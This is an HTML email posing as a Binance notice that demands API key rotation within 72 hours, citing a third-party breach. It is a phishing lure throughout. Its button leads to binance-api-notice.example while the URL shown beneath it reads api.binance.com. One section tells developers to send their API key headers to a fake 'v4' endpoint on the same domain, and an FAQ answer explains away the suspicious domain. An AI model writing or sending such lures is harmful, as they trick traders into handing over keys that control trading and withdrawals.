<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Why rotation is required</h3>
<p>On October 2, 2026, our security team identified unauthorized access to the API key management system of a third-party service provider. While your specific keys were <b>not</b> directly compromised, we are rotating all API keys created before April 2025 as a precautionary measure.</p>

<p>If your API keys expire without rotation, all automated trading, withdrawal, and account management functions will be suspended.</p>

<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">How to rotate your API keys</h3>

<p><b>Method 1 (Recommended) — Via API Management Portal:</b></p>
<p>Access the API rotation portal and generate new keys:</p>

<p style="text-align:center;margin:20px 0">
<a href="https://binance-api-notice.example/api/v3/rotation?user=trading" style="display:inline-block;background:#F0B90B;color:#000;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Rotate API Keys Now</a>
</p>

<p style="font-size:13px;color:#666;text-align:center">https://api.binance.com/api/v3/management/rotation</p>

<p style="font-size:12px;color:#888;text-align:center">(Log in with your Binance account email and 2FA code. New keys will be displayed once.)</p>

<p><b>Method 2 — Via new API endpoint migration:</b></p>
<p>If you use programmatic key management, update your API base URL to the new endpoint:</p>
<pre style="background:#f5f5f5;padding:12px;border-radius:4px;font-size:13px;overflow-x:auto"><code># Old endpoint (deprecated after rotation):
https://api.binance.com/api/v3

# New endpoint (v4, supports auto-rotation):
https://api-v4.binance-api-notice.example/api/v4

# Authentication header remains the same:
X-MBX-APIKEY: &lt;your_new_api_key&gt;</code></pre>

<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Impact on automated trading</h3>
<p>If you operate algorithmic trading bots or market-making systems:</p>
<ul>
<li><b>Trading bots:</b> Must update API keys before the 72-hour deadline. Open positions will remain but new orders will be rejected.</li>
<li><b>WebSocket streams:</b> Active connections will be terminated. Reconnect with new keys.</li>
<li><b>Withdrawal whitelist:</b> IP whitelist entries will be preserved but must be re-verified.</li>
<li><b>Sub-accounts:</b> Sub-account API keys must be rotated individually by the master account.</li>
</ul>

<h3 style="color:#F0B90B;border-bottom:2px solid #F0B90B;padding-bottom:4px">Security FAQ</h3>
<p><b>Q: Is this email legitimate? The domain looks unusual.</b><br>
A: We use a dedicated notification domain for security-critical API communications to avoid confusion with regular marketing emails. Your actual API operations always happen on <code>api.binance.com</code>. The rotation button above takes you to the official API management portal.</p>

<p><b>Q: Can I skip this rotation?</b><br>
A: No. All pre-April 2025 keys will be automatically invalidated after the 72-hour window. This is not optional.</p>

<p><b>Q: Will my trading history be affected?</b><br>
A: No. Historical data is preserved. Only the API keys change.</p>

